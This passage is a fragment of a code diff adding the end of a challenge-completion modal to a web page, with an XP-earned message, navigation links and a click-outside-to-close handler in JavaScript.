+                        <p class="text-gray-600 dark:text-gray-300 mb-6">You've earned ${xpEarned} XP!</p>
+                        <div class="flex space-x-4">
+                            <a href="/" class="flex-1 px-4 py-2 bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-white rounded hover:bg-gray-300 dark:hover:bg-gray-600 transition text-center">
+                                Back to Home
+                            </a>
+                            <a href="/challenges" class="flex-1 px-4 py-2 bg-primary-500 text-white rounded hover:bg-primary-600 transition text-center">
+                                Next Challenge
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            `;
+document.body.appendChild(modal);
+            feather.replace();
+            
+            // Click outside to close
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    document.body.removeChild(modal);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
